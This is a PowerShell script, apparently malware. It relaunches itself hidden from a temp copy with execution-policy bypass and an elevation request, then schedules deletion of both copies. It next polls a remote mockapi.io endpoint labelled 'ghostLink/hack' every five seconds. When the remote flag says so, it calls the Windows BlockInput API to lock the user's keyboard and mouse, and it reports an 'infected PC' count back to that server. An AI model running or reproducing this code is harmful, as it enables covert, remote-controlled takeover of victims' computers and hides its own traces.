param(
    [switch]$IsTempInstance,
    [string]$OriginalScriptPath = ""
)

if (-not $IsTempInstance.IsPresent) {
    Write-Host "Starting initial script instance..." -ForegroundColor Gray
    $currentScriptPath = $MyInvocation.MyCommand.Path
    $tempScriptPath = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".ps1")
    Write-Host "Creating temporary script at: $tempScriptPath" -ForegroundColor Gray
    try {
        Get-Content -Path $currentScriptPath -Raw | Out-File -FilePath $tempScriptPath -Encoding UTF8 -Force
        $arguments = @(
            "-NoProfile"
            "-ExecutionPolicy", "Bypass"
            "-File", "`"$tempScriptPath`""
            "-IsTempInstance"
            "-OriginalScriptPath", "`"$currentScriptPath`""
        )
        Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden -Verb RunAs -PassThru
        exit 0
    } catch {
        Write-Error "Failed to create or launch temporary instance: $($_.Exception.Message)"
        exit 1
    }
} else {
    Write-Host "Running from temporary location: $($MyInvocation.MyCommand.Path)" -ForegroundColor Cyan
    if (-not [string]::IsNullOrEmpty($OriginalScriptPath) -and (Test-Path $OriginalScriptPath)) {
        try {
            $tempScriptSelfPath = $MyInvocation.MyCommand.Path
            $deleteCommand = "Start-Sleep -Seconds 5; Remove-Item -Path `"$OriginalScriptPath`" -Force -ErrorAction SilentlyContinue; Remove-Item -Path `"$tempScriptSelfPath`" -Force -ErrorAction SilentlyContinue"
            $deleteArguments = @(
                "-NoProfile"
                "-ExecutionPolicy", "Bypass"
                "-Command", $deleteCommand
            )
            Start-Process powershell.exe -ArgumentList $deleteArguments -WindowStyle Hidden
        } catch {
            Write-Warning "Failed to schedule deletion of original/temporary script: $($_.Exception.Message)"
        }
    } else {
        Write-Warning "Original script path '$OriginalScriptPath' not provided or not found. Skipping deletion scheduling."
    }
    Write-Host "Proceeding with main script logic from temporary instance..." -ForegroundColor Cyan
}

# Variables globales
$global:blockUserInput = $null
$global:nbPcInfect = 0
$global:nbPcInfectIncr = $null
$global:lastNbPcInfectIncr = ""

function checkDataBase {
    try {
        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack/" -Method Get -TimeoutSec 5
        if ($response -ne $null) {
            $global:blockUserInput = $response.blockUserInput
            $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
            $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
        } else {
            $global:blockUserInput = $null
            $global:nbPcInfect = 0
            $global:nbPcInfectIncr = $null
        }
    } catch {
        $global:blockUserInput = $null
        $global:nbPcInfect = 0
        $global:nbPcInfectIncr = $null
    }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class BlockInputHelper {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

function Block-UserInput {
    [BlockInputHelper]::BlockInput($true) | Out-Null
}

function Unblock-UserInput {
    [BlockInputHelper]::BlockInput($false) | Out-Null
}

function main {
    checkDataBase
    $global:lastNbPcInfectIncr = $global:nbPcInfectIncr
    while ($true) {
        checkDataBase
        if ($global:blockUserInput -eq $true) {
            Block-UserInput
        } else {
            Unblock-UserInput
        }
        if ($global:nbPcInfectIncr -ne $global:lastNbPcInfectIncr) {
            $updatedNbPcInfect = $global:nbPcInfect + 1
            $body = @{
                nbPcInfect = @{
                    nbPcInfect = $updatedNbPcInfect
                    nbPcInfectIncr = $global:nbPcInfectIncr
                }
            } | ConvertTo-Json
            $headers = @{ "Content-Type" = "application/json" }
            try {
                Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack/1" `
                                  -Method Put `
                                  -Body $body `
                                  -Headers $headers
                $global:lastNbPcInfectIncr = $global:nbPcInfectIncr
            } catch {
                # Ignorer l'erreur ou logger si besoin
            }
        }
        Start-Sleep -Seconds 5
    }
}

main
